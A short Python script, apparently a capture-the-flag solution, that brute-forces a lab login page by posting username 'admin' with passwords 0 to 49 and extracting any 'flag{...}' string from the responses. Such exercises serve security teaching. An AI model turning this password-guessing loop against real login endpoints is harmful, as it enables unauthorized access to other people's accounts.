import re
import requests

URL = "https://t02-a4b4d85430ba5c10.itsec.sec.in.tum.de/login"

# Returns only the flag if there is one in the passed string, otherwise returns None
def extract_flag_from_string(string):
    match = re.search(r'flag\{[^}]+}', string)
    if match:
        return match.group(0)

    return None

with requests.Session() as sess:
    for j in range(50):
        data = {
            "username": "admin",
            "password": j
        }
        response = sess.post(URL, data=data)
        flag = extract_flag_from_string(response.text)
        if flag:
            print(flag)
            break